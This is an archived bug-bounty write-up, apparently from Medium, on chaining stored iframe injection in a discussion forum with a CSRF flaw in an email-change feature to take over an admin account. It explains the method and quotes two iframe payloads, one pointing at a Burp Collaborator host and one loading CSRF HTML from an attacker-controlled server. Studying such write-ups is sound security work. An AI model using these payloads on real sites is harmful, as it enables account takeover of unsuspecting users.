---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-12-16_stored-iframe-injection-csrf-account-takeover.md
original_filename: 2019-12-16_stored-iframe-injection-csrf-account-takeover.md
title: Stored Iframe Injection + CSRF = Account Takeover 😎😎
category: documents
detected_topics:
- xss
- csrf
- command-injection
- cloud-security
tags:
- imported
- documents
- xss
- csrf
- command-injection
- cloud-security
language: en
raw_sha256: 0983a8cb227bc96d02c90a86720a236e9700c547c1bae18141a7009efe44b0d3
text_sha256: cf48f83514a13d2beb3197f6c086610477bb993d259e81d658412221d7ec45d6
ingested_at: '2026-06-28T07:32:00Z'
sensitivity: unknown
redactions_applied: false
---

# Stored Iframe Injection + CSRF = Account Takeover 😎😎

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-12-16_stored-iframe-injection-csrf-account-takeover.md
- Source Type: markdown
- Detected Topics: xss, csrf, command-injection, cloud-security
- Ingested At: 2026-06-28T07:32:00Z
- Redactions Applied: False
- Raw SHA256: `0983a8cb227bc96d02c90a86720a236e9700c547c1bae18141a7009efe44b0d3`
- Text SHA256: `cf48f83514a13d2beb3197f6c086610477bb993d259e81d658412221d7ec45d6`


## Content

---
title: "Stored Iframe Injection + CSRF = Account Takeover 😎😎"
url: "https://medium.com/@irounakdhadiwal999/stored-iframe-injection-csrf-account-takeover-42c93ad13f5d"
authors: ["Rounak Dhadiwal (@XploiteR_D)"]
bugs: ["HTML injection", "CSRF"]
publication_date: "2019-12-16"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4885
scraped_via: "browseros"
---

# Stored Iframe Injection + CSRF = Account Takeover 😎😎

Stored Iframe Injection + CSRF = Account Takeover 😎😎
Rounak Dhadiwal
Follow
3 min read
·
Dec 16, 2019

397

1

Before we Start lets Clear some Questions
What is Iframe Injection.

Frame injection is a type of code injection vulnerability where attacker can injection frames which contains links to malicious websites or advertisements links. To know more about Iframe Injection you can click here.

2. After Injecting the Iframe in page, who actually calls the Iframe [ Client’s Browser or server].

Iframes that are injected into web pages are mostly called by Client’s Browser except in some cases like PDF generators. To check who is calling the injected frame you can inject an frame which source of Burp Collaborator like [<iframe src=xxxxxx.burpcollaborator.net></iframe> ], and checking the logs of Burp Collaborator will reveal the caller of Frame.😮😮

3.What is Cross Site Request Forgery ( CSRF).

Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they’re currently authenticated. To learn more about CSRF you can visit PortSwigger.

So Lets get Started

When you start to hunt on particular domain , the best thing to do first is to take a look at all the features of the domain and take a note of that. Understanding the flow of a particular website will help you to chain attacks and logically break it. It was a private Program so lets consider the site ABC.com

After looking at all the features i got to know that there is an Discussion Forum where all the members of community can chat with each others.

Press enter or click to view image in full size

Here you can start a topic and discuss it with your community members.

So i started to inject my payload on reply feature, which concluded that the reply section was vulnerable to HTML Injection but not to XSS. I tried to inject many XSS payloads but didn't succeeded.

Press enter or click to view image in full size

So i tried to inject Iframe and BOOM! It was reflected. 😋 😋 So my next task was to increase the Impact of these vulnerability ,😮😮 so i started other features of the website too.

Get Rounak Dhadiwal’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

After some time i came across a section where i was able to change my email address .

The first think that came into my mind was to try CSRF attack . And the request to change the email looked like.

Press enter or click to view image in full size

Which confirmed that Email change feature is vulnerable to CSRF attack .So i quickly generated HTML code.

Press enter or click to view image in full size

But to perform an CSRF attack Victim must link on visit a particular link from where the request to change email will be sent. But these was not possible here because admin would not click on any malicious link . So i thought lets combine the CSRF with Iframe Injection which i found earlier .

So i started my AWS Server lets consider it has ip [x.x.x.x] and copied the CSRF code in index.html page.

After that i injected the iframe payload i.e <iframe src=http://x.x.x.x/index.html”></iframe> in discussion forum and it was GAME OVER for admin after viewing the discussion forum, because he’s email id was changed to attacker’s email id.

ATTACK SCENARIO:-
Attacker will inject iframe into Discussion Forum which contains the link of email change request.
After victim or admin visits the discussion forum their browser’s will load the iframe which will lead to send the email change request from victims machine.

Thank you for reading . 😊😊
